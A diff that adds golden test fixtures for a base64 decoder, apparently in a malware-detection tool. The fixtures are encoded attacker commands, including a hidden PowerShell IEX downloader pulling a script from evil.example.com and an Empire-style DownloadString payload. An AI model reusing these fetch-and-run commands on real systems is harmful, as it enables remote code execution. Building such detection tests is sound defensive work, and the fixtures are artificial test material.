@@ -1,0 +1,8 @@
+# base64-decode · Golden Fixtures · RC3.2a
+# Standard RFC-4648 base64 + urlsafe variant + noise-padding edge cases.
+{"case_id":"b64-plain-cmd","description":"Standard b64 → plaintext cmd.exe","input":"Y21kLmV4ZSAvYyBjYWxjLmV4ZQ==","detect_min_confidence":0.5,"expected_output":"cmd.exe /c calc.exe"}
+{"case_id":"b64-ps-iex","description":"b64-wrapped PowerShell IEX downloader","input":"cG93ZXJzaGVsbC5leGUgLW5vcCAtVyBoaWRkZW4gLWMgSUVYIChJd3IgaHR0cDovL2V2aWwuZXhhbXBsZS5jb20vYS5wczEp","detect_min_confidence":0.5,"expected_output_contains":["powershell.exe","IEX","http://evil.example.com/a.ps1"]}
+{"case_id":"b64-urlsafe-strict","description":"URL-safe b64 (-_) variant round-trips via strict alphabet","input":"cG93ZXJzaGVsbC5leGUgLWMgJ2h0dHBzOi8vYS5jb20nCg==","detect_min_confidence":0.5,"expected_output_contains":["powershell","https://a.com"]}
+{"case_id":"b64-utf16-encoded-payload","description":"b64 of a UTF-16LE PowerShell string (Empire pattern; decode returns UTF-16 bytes)","input":"SQBFAFgAKAAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACAAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBhAC4AYgAvAGMAJwApAA==","detect_min_confidence":0.5,"expected_output_contains":["I","E","X"]}
+{"case_id":"b64-nopad","description":"No-padding b64 (chunk length ≡ 2 mod 4)","input":"Y21kLmV4ZSAvYyBjYWxjLmV4ZQ","detect_min_confidence":0.4,"expected_output_contains":["cmd.exe","calc"]}
+{"case_id":"b64-with-whitespace","description":"b64 broken across lines (canonical email/HTML wrap) still decodes","input":"Y21kLmV4ZSAvYyBjYWxj\nLmV4ZSAmJiBk\ncm9wLmV4ZQ==","detect_min_confidence":0.4,"expected_output_contains":["cmd.exe","calc.exe","drop.exe"]}
